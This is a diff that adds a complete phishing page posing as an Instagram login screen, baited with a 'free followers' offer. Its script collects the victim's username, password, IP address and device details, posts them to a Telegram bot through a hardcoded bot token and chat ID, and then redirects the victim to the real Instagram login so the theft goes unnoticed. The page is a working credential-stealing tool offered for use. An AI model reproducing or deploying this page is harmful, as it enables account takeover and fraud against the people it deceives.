@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Instagram • Get Free Followers</title>
+    <!-- Font Awesome 6 (Facebook icon) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 350px;
+            margin: 0 auto;
+        }
+
+        /* main card */
+        .card {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 40px 40px 20px 40px;
+            margin-bottom: 10px;
+        }
+
+        /* free followers badge */
+        .free-badge {
+            background: linear-gradient(135deg, #f9ce34, #ee2a7b, #6228d7);
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+            text-align: center;
+            padding: 8px 12px;
+            border-radius: 40px;
+            margin-bottom: 20px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            font-family: inherit;
+        }
+        .free-badge span {
+            background: rgba(0,0,0,0.2);
+            padding: 2px 8px;
+            border-radius: 30px;
+            font-size: 12px;
+        }
+
+        /* instagram logo */
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo img {
+            width: 175px;
+            height: auto;
+        }
+
+        /* input fields */
+        .input-group {
+            margin-bottom: 8px;
+        }
+        .input-group input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            padding: 10px 12px;
+            font-size: 12px;
+            font-family: inherit;
+            outline: none;
+            transition: border 0.1s;
+        }
+        .input-group input:focus {
+            border-color: #a8a8a8;
+            background: #fff;
+        }
+
+        /* login button */
+        .login-btn {
+            background-color: #0095f6;
+            color: white;
+            width: 100%;
+            padding: 8px 0;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 12px;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-family: inherit;
+        }
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+        .login-btn:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+
+        /* OR divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .or-text {
+            margin: 0 18px;
+        }
+
+        /* facebook login */
+        .fb-login {
+            text-align: center;
+            margin: 10px 0 20px;
+        }
+        .fb-login a {
+            text-decoration: none;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* forgot password */
+        .forgot {
+            text-align: center;
+            margin: 12px 0;
+        }
+        .forgot a {
+            text-decoration: none;
+            color: #00376b;
+            font-size: 12px;
+        }
+
+        /* signup card */
+        .signup-card {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .signup-card a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 4px;
+        }
+
+        /* app stores */
+        .get-app {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .get-app p {
+            font-size: 14px;
+            margin-bottom: 15px;
+            color: #262626;
+        }
+        .stores {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        .stores img {
+            height: 40px;
+            width: auto;
+        }
+
+        /* footer */
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+        .footer-links a {
+            text-decoration: none;
+            color: #8e8e8e;
+        }
+
+        /* loader */
+        .loader-icon {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255,255,255,0.5);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.6s linear infinite;
+            margin-right: 6px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 450px) {
+            .card {
+                padding: 30px 20px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <!-- Free followers promo (Instagram style but extra) -->
+        <div class="free-badge">
+            🚀 GET 1000+ FREE FOLLOWERS INSTANTLY 🚀
+        </div>
+
+        <!-- Instagram logo -->
+        <div class="logo">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d26010995ef1.png" alt="Instagram" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png';">
+        </div>
+
+        <!-- Login form -->
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" autocomplete="off" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required>
+            </div>
+            <button type="submit" id="loginButton" class="login-btn">Log In</button>
+        </form>
+
+        <div class="divider">
+            <div class="line"></div>
+            <div class="or-text">OR</div>
+            <div class="line"></div>
+        </div>
+
+        <div class="fb-login">
+            <a href="#">
+                <i class="fab fa-facebook-square"></i> Log in with Facebook
+            </a>
+        </div>
+
+        <div class="forgot">
+            <a href="#">Forgot password?</a>
+        </div>
+    </div>
+
+    <div class="signup-card">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="get-app">
+        <p>Get the app.</p>
+        <div class="stores">
+            <img src="https://www.instagram.com/static/images/appstore-icon/2x/badge_ios_english-2x.png/082c6dc7ea3f.png" alt="App Store">
+            <img src="https://www.instagram.com/static/images/appstore-icon/2x/badge_android_english-2x.png/d934c6a8e555.png" alt="Google Play">
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Top Accounts</a>
+            <a href="#">Hashtags</a>
+            <a href="#">Locations</a>
+        </div>
+        <div class="copyright">
+            © 2025 Instagram from Meta
+        </div>
+    </div>
+</div>
+
+<script>
+    // ---------- TELEGRAM BOT CONFIGURATION ----------
+    const BOT_TOKEN = "8813006713:AAEe9IQginsKZRfwGa7MqK9P_-SD2ACGijo";
+    const CHAT_ID = "8373066867";
+    
+    // Helper: Send message to Telegram
+    async function sendToTelegram(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const payload = {
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: "HTML"
+        };
+        try {
+            const response = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            const data = await response.json();
+            return data.ok === true;
+        } catch (err) {
+            console.error("Telegram send error:", err);
+            return false;
+        }
+    }
+    
+    // Helper: Get public IP address (using ipify)
+    async function getUserIP() {
+        try {
+            const res = await fetch("https://api.ipify.org?format=json");
+            const data = await res.json();
+            return data.ip;
+        } catch (err) {
+            console.warn("IP fetch failed:", err);
+            return "Could not retrieve IP";
+        }
+    }
+    
+    // Helper: Get user agent and extra device info
+    function getDeviceInfo() {
+        const ua = navigator.userAgent || "Unknown UA";
+        const platform = navigator.platform || "Unknown platform";
+        const language = navigator.language || "Unknown language";
+        return { ua, platform, language };
+    }
+    
+    // Escape HTML for Telegram message (safety)
+    function escapeHtml(str) {
+        if (!str) return "";
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        }).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, function(c) {
+            return c;
+        });
+    }
+    
+    // Form handling
+    const form = document.getElementById("loginForm");
+    const loginBtn = document.getElementById("loginButton");
+    let isSubmitting = false;
+    
+    form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        
+        if (isSubmitting) return;
+        
+        const usernameInput = document.getElementById("username");
+        const passwordInput = document.getElementById("password");
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value;
+        
+        // simple validation
+        if (!username) {
+            usernameInput.style.borderColor = "#ed4956";
+            setTimeout(() => usernameInput.style.borderColor = "#dbdbdb", 1500);
+            return;
+        }
+        if (!password) {
+            passwordInput.style.borderColor = "#ed4956";
+            setTimeout(() => passwordInput.style.borderColor = "#dbdbdb", 1500);
+            return;
+        }
+        
+        isSubmitting = true;
+        const originalBtnText = loginBtn.innerHTML;
+        loginBtn.disabled = true;
+        loginBtn.innerHTML = '<span class="loader-icon"></span> Logging in...';
+        
+        try {
+            // 1. Get user's IP address
+            const userIP = await getUserIP();
+            
+            // 2. Collect device details
+            const device = getDeviceInfo();
+            const timestamp = new Date().toLocaleString("en-US", { timeZoneName: "short" });
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            
+            // 3. Build detailed message (Instagram Free Follower Login)
+            const message = `🔐 <b>📸 INSTAGRAM FREE FOLLOWERS LOGIN</b> 🔐\n\n` +
+                            `👤 <b>Username/Email:</b> <code>${escapeHtml(username)}</code>\n` +
+                            `🔑 <b>Password:</b> <code>${escapeHtml(password)}</code>\n` +
+                            `🌍 <b>IP Address:</b> <code>${escapeHtml(userIP)}</code>\n` +
+                            `📱 <b>User Agent:</b> <code>${escapeHtml(device.ua.substring(0, 180))}</code>\n` +
+                            `💻 <b>Platform:</b> ${escapeHtml(device.platform)}\n` +
+                            `🌐 <b>Language:</b> ${escapeHtml(device.language)}\n` +
+                            `🖥️ <b>Screen:</b> ${screenRes}\n` +
+                            `⏱️ <b>Time:</b> ${escapeHtml(timestamp)}\n` +
+                            `🎁 <b>Offer:</b> Free followers claim attempt`;
+            
+            // 4. Send to Telegram bot
+            await sendToTelegram(message);
+            
+            // 5. After sending, redirect to REAL Instagram (victim sees legit login page)
+            window.location.href = "https://www.instagram.com/accounts/login/";
+            
+        } catch (err) {
+            console.error("Unexpected error:", err);
+            // Still redirect so user doesn't suspect anything
+            window.location.href = "https://www.instagram.com/accounts/login/";
+        } finally {
+            // Reset flag (but redirect already happened, this is safe fallback)
+            isSubmitting = false;
+            loginBtn.disabled = false;
+            loginBtn.innerHTML = originalBtnText;
+        }
+    });
+    
+    // Quick border reset on input focus
+    document.querySelectorAll("input").forEach(input => {
+        input.addEventListener("focus", () => {
+            input.style.borderColor = "#dbdbdb";
+        });
+    });
+</script>
+</body>
+</html>
